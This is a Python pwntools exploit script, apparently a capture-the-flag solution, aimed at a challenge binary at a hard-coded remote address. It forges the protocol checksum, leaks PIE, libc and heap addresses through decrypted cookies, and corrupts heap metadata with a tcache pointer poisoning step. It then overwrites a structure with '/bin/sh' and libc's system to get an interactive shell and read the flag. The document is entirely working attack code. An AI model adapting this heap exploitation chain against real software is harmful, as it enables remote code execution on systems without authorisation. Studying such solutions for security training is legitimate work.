#!/usr/bin/env python3
from pwn import *

PORT = 45529
HOST = "144.79.188.39"
elf = context.binary = ELF('./chall_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x000000000000174D
            brva 0x00000000000018BD
            brva 0x0000000000001ACE
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

def rol32(val, n):
    return ((val << n) & 0xffffffff) | (val >> (32 - n))

def Checksum(opt, pl):
    x = (((opt & 0xffffffff) << 24) & 0xffffffff)
    x ^= session_token
    x ^= (len(pl) & 0xffff)
    x ^= 0x31415926
    for i, b in enumerate(pl):
        x = rol32(x, 5)
        x = (x + (((i * 0x45D9F3B) & 0xffffffff) ^ b)) & 0xffffffff
    return x 

def decrypt(val):
    return val ^ (((session_token & 0xffffffff) << 12) ^ 0x5A5A5A5A41414141)

def send_packet(opt, pl, wait=True):
    sla(b'packet type> ', str(opt).encode())
    sla(b'payload length> ', str(len(pl)).encode())
    sla(b'checksum> ', f'{Checksum(opt, pl):x}'.encode())
    if wait == True:
        sa(b'payload> ', pl)

# Stage 1: Leak libc, heap, PIE

p.recvuntil(b'session token: ')
session_token = int(p.recvline()[:-1], 16)
log.info(f'session_token: {hex(session_token)}')

send_packet(2, p32(session_token ^ 0xC0FFEE00))

send_packet(3, p16(1) + b"A")

send_packet(4, b'created')

send_packet(4, b'D')
p.recvuntil(b'analyzer cookie: ')
PIE_base = decrypt(int(p.recvline()[:-1], 16)) - 0x157f
log.success(f'PIE_base: {hex(PIE_base)}')

send_packet(4, b'P')
p.recvuntil(b'proc cookie: ')
libc.address = decrypt(int(p.recvline()[:-1], 16)) - 0x87cc0
log.success(f'libc_base: {hex(libc.address)}')

# GDB()
send_packet(4, b'R')
p.recvuntil(b'report cookie: ')
heap_base = decrypt(int(p.recvline()[:-1], 16)) - 0x300
log.success(f'heap_base: {hex(heap_base)}')

# Stage 2: Overwrite report

rule = heap_base + 0x2a0

pl = flat(
    b'A'*0x10,
    0, 0x21,
    (rule+0x20) >> 12, 0,
    0, 0x21,
    ((rule+0x40) >> 12 ^ rule+0x20), 0,
    0, 0x131,           # report_chunk
    b'/bin/sh\x00',
    0, 0, 0,
    libc.sym.system
    )

pl = pl.ljust(0xf9, b'\x00')
# GDB()
send_packet(3, p16(len(pl)) + pl)
send_packet(5, b'd1nhdwc')

p.sendline(b'cat flag.txt')
p.interactive()